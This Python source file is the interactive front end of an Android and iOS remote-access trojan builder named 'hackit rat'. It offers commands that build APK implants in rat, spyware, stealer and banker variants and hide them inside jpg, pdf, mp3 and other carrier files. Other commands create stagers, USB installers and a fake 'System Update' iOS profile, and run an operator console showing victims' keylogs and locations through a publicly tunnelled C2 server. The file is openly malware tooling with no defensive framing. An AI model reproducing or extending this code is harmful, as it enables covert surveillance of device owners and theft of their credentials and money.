"""Bare `hackit rat` surface: banner, help, then an input loop with no flags.

The loop is the product: `make apk`, `make file`, `make ios`, `make stager`,
`run`. Anything typed that is not a verb is treated as a verb argument, so
`make apk` and `make apk agent.apk` both work without a parser.
"""
from __future__ import annotations

import json
import os
from typing import List, Optional

from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_WHITE, B_YELLOW, DIM, GREEN, RED, YELLOW

from . import builder, ios, polyglot, samples, server, store, ui

BANNER = "\n".join(
    [
        _colored("                 ______", B_WHITE),
        _colored("              .-\"      \"-.", B_WHITE),
        _colored("             /            \\", B_WHITE),
        _colored("            |              |", B_WHITE),
        _colored("            |,  .-.  .-.  ,|", B_WHITE),
        _colored("            | )(_O/  \\O_)( |", B_WHITE),
        _colored("            |/     /\\     \\|", B_WHITE),
        _colored("    .-~~~-. (_     ^^     _) .-~~~-.", B_MAGENTA),
        _colored("   /  *    \\ \\__|IIIIII|__/ /    *  \\", B_MAGENTA),
        _colored("   |   .    |/  \\IIIIII/  \\|    .   |", B_MAGENTA),
        _colored("    \\  '   / |   ", B_MAGENTA)
        + _colored("HACKIT", B_GREEN)
        + _colored("   | \\   '  /", B_MAGENTA),
        _colored("     '-..-'   \\    ", B_MAGENTA)
        + _colored("RAT", B_GREEN)
        + _colored("   /   '-..-'", B_MAGENTA),
        _colored("         .      '._______.'      .", B_MAGENTA),
        _colored("        /|\\       /  |  \\       /|\\", B_MAGENTA),
        _colored("       / | \\     /   |   \\     / | \\", B_MAGENTA),
        _colored("      *  |  *   '    |    '   *  |  *", B_MAGENTA),
        _colored("                  v i r u s", B_MAGENTA),
        _colored("   android · ios · native · carriers · 21 file formats", B_CYAN),
        _colored("   type `help` · `run` opens the live UI", DIM),
    ]
)

HELP: List[tuple] = [
    ("inject <spec> <file>", "hide a sealed payload in that file (jpg/pdf/mp3/…/apk)"),
    ("make app [name] [spec]", "build the APK (spec: rat/trojan/spyware/malware/stealer/banker/bot)"),
    ("make installer [spec]", "offline USB installer: APK + setup.bat + setup.sh"),
    ("make file <ext> [carrier]", "hide the APK in one carrier format"),
    ("make stager [host]", "one-command installer + landing page + iOS profile"),
    ("make ios [url]", "WebClip profile + PWA link for iPhone"),
    ("run", "live operator UI (sessions, feed, keylog, location)"),
    ("tunnel [provider]", "expose the C2 publicly (cloudflared/ngrok/ssh)"),
    ("sessions", "list known devices"),
    ("doctor", "toolchain readiness"),
    ("help / clear / quit", "this list / clear screen / leave"),
]

CONFIG_PATH = os.path.join(store.ROOT, "agent.json")


def _host_from_config() -> Optional[str]:
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as handle:
            return json.load(handle).get("host")
    except (OSError, ValueError):
        return None


def _ensure_config(spec: str = "rat") -> dict:
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r", encoding="utf-8") as handle:
                existing = json.load(handle)
            existing.setdefault("spec", "rat")
            if spec != "rat" and existing.get("spec") != spec:
                existing["spec"] = spec
                existing["modules"] = sorted(set(builder.CORE_MODULES + builder.SPECS[spec]))
                with open(CONFIG_PATH, "w", encoding="utf-8") as handle:
                    json.dump(existing, handle, indent=2)
            return existing
        except (OSError, ValueError):
            pass
    host = input(_colored("  C2 host (https://host): ", B_GREEN)).strip()
    if not host:
        raise SystemExit(_colored("  host required", RED))
    label = input(_colored("  implant label [android]: ", B_GREEN)).strip() or "android"
    config = builder.make_config(host, _psk_b64(), label, 60000, True, "", spec)
    os.makedirs(os.path.dirname(CONFIG_PATH), exist_ok=True)
    with open(CONFIG_PATH, "w", encoding="utf-8") as handle:
        json.dump(config, handle, indent=2)
    os.chmod(CONFIG_PATH, 0o600)
    print(_colored(f"  config  {CONFIG_PATH}", DIM))
    return config


def _psk_b64() -> str:
    import base64

    return base64.b64encode(server.load_psk(store.ROOT + "/psk.txt")
                            if os.path.exists(store.ROOT + "/psk.txt")
                            else server.write_psk(store.ROOT + "/psk.txt")).decode("ascii")


def _latest_apk() -> Optional[str]:
    root = os.path.join(store.ROOT, "build")
    if not os.path.isdir(root):
        return None
    candidates = []
    for base, _dirs, names in os.walk(root):
        for name in names:
            if name.endswith(".apk"):
                path = os.path.join(base, name)
                candidates.append((os.path.getmtime(path), path))
    return max(candidates)[1] if candidates else None


def _build_apk(name: str = "agent", spec: str = "rat") -> str:
    config = _ensure_config(spec)
    out = os.path.join(store.ROOT, "dist", name if name.endswith(".apk") else name + ".apk")
    return builder.build(config, engine="auto", release=True, out=out)


def _inject(spec: str, target: str) -> None:
    """inject <spec> <file> — hide the payload inside `target` (or make one)."""
    if spec not in builder.SPECS:
        print(_colored(f"  unknown spec {spec!r} — {', '.join(sorted(builder.SPECS))}", YELLOW))
        return
    ext = os.path.splitext(target)[1].lower().lstrip(".") or "pdf"
    if ext not in polyglot.MODES:
        print(_colored(f"  no carrier recipe for .{ext} — {', '.join(sorted(polyglot.MODES))}", YELLOW))
        return
    apk = _latest_apk()
    if not apk:
        print(_colored(f"  no APK yet — building one (spec: {spec})", DIM))
        apk = _build_apk("agent", spec)
    folder = os.path.join(store.ROOT, "dist", spec)
    os.makedirs(folder, exist_ok=True)
    if os.path.isfile(target):
        source = target
    else:
        source = samples.sample(ext, folder)
        print(_colored(f"  carrier sample {source}", DIM))
    result = polyglot.build(source, apk, out_dir=folder, encrypt=True)
    print(_colored(f"  spec      {spec} · modules {', '.join(builder.SPECS[spec]) or '-'}", B_CYAN))
    print(_colored(f"  carrier   {result.carrier}", B_GREEN))
    print(_colored(f"  sealed    {result.size:,} bytes  sha256 {result.digest[:16]}…", DIM))
    for path in result.launchers:
        print(_colored(f"  helper    {path}", DIM))


def _make_file(ext: str, carrier: Optional[str], name: str) -> None:
    apk = _latest_apk()
    if not apk:
        print(_colored("  no APK yet — building one", DIM))
        apk = _build_apk("agent")
    folder = os.path.join(store.ROOT, "dist")
    os.makedirs(folder, exist_ok=True)
    if carrier and os.path.isfile(carrier):
        source = carrier
    else:
        source = samples.sample(ext, folder)
        print(_colored(f"  sample carrier  {source}", DIM))
    result = polyglot.build(source, apk, out_dir=folder, encrypt=True)
    print(_colored(f"  carrier   {result.carrier}", B_GREEN))
    print(_colored(f"  payload   {result.size:,} bytes  sha256 {result.digest[:16]}…", DIM))
    for path in result.launchers:
        print(_colored(f"  helper    {path}", DIM))


def _make_installer(spec: str, label: str) -> None:
    from . import installer
    apk = _latest_apk()
    if not apk:
        apk = _build_apk("agent", spec)
    config = _ensure_config(spec)
    folder = os.path.join(store.ROOT, "dist", f"installer-{installer.stamp()}")
    made = installer.build(apk, folder, spec, label or config.get("label", "agent"))
    for path in made:
        print(_colored(f"  {path}", B_GREEN))


def _make_stager(host: Optional[str]) -> None:
    from . import stager

    config = _ensure_config()
    target = host or config["host"]
    out = stager.build(target, config, os.path.join(store.ROOT, "dist"))
    for path in out:
        print(_colored(f"  {path}", B_GREEN))


def _make_ios(url: Optional[str]) -> None:
    config = _ensure_config()
    base = url or config["host"].rstrip("/")
    folder = os.path.join(store.ROOT, "dist")
    os.makedirs(folder, exist_ok=True)
    path = ios.write_profile(folder, "System Update", base + "/w/" + _web_token())
    print(_colored(f"  profile   {path}", B_GREEN))
    print(_colored(f"  open      {base}/w/{_web_token()}/ once to register the PWA", DIM))


def _web_token() -> str:
    path = os.path.join(store.ROOT, "webtoken")
    if os.path.exists(path):
        return open(path, encoding="utf-8").read().strip()
    token = os.urandom(9).hex()
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(token)
    return token


def _print_sessions() -> None:
    store.init()
    rows = store.sessions()
    if not rows:
        print(_colored("  no devices", DIM))
        return
    for row in rows:
        dot = _colored("●", GREEN) if row["online"] else _colored("○", DIM)
        kind = row.get("kind", "apk")
        spec = row.get("spec", "rat")
        print(f"  {dot} {_colored(row['sid'][:18], B_WHITE)} {_colored(spec, B_MAGENTA)} "
              f"{_colored(kind, B_YELLOW)} {row.get('model') or '?'} {row.get('battery') or 0}%")


def interactive() -> None:
    store.init()
    print(BANNER)
    if not os.path.exists(CONFIG_PATH):
        print(_colored("  first run: host + PSK will be minted now", DIM))
    while True:
        try:
            line = input(_colored("rat> ", B_GREEN)).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if not line:
            continue
        parts = line.split()
        verb = parts[0].lower()
        args = parts[1:]
        try:
            if verb in ("quit", "exit", "q"):
                return
            if verb in ("help", "?", "menu"):
                for name, desc in HELP:
                    print(f"  {_colored(name.ljust(26), B_WHITE)} {_colored(desc, DIM)}")
            elif verb == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                print(BANNER)
            elif verb == "sessions":
                _print_sessions()
            elif verb == "doctor":
                raise SystemExit(builder.doctor())
            elif verb == "tunnel":
                from . import tunnel

                port = int(args[1]) if len(args) > 1 and args[1].isdigit() else 8443
                url = tunnel.start(port, args[0] if args and not args[0].isdigit() else "auto")
                if not url:
                    print(_colored("  no tunnel available — install cloudflared or ngrok", YELLOW))
            elif verb == "run":
                key = server.load_psk(os.path.join(store.ROOT, "psk.txt"))
                ui.run("0.0.0.0", 8443, key, _host_from_config() or "http://127.0.0.1:8443")
            elif verb == "inject":
                if len(args) < 1:
                    print(_colored("  inject <spec> <file>", YELLOW))
                else:
                    _inject(args[0].lower(), args[1] if len(args) > 1 else "")
            elif verb == "make":
                what = (args[0] if args else "").lower()
                if what in ("apk", "app"):
                    _build_apk(args[1] if len(args) > 1 else "agent", args[2] if len(args) > 2 else "rat")
                elif what == "installer":
                    _make_installer(args[1] if len(args) > 1 else "rat", "agent")
                elif what == "file":
                    ext = (args[1] if len(args) > 1 else "").lower().lstrip(".")
                    if ext not in polyglot.MAGICS:
                        print(_colored(f"  choose: {', '.join(polyglot.MAGICS)}", YELLOW))
                        continue
                    _make_file(ext, args[2] if len(args) > 2 else None,
                               args[3] if len(args) > 3 else "agent")
                elif what == "stager":
                    _make_stager(args[1] if len(args) > 1 else None)
                elif what == "ios":
                    _make_ios(args[1] if len(args) > 1 else None)
                else:
                    print(_colored("  make apk | make file <ext> | make stager | make ios", YELLOW))
            else:
                print(_colored(f"  unknown: {verb} — help", YELLOW))
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print()
        except Exception as exc:
            print(_colored(f"  error: {exc}", RED))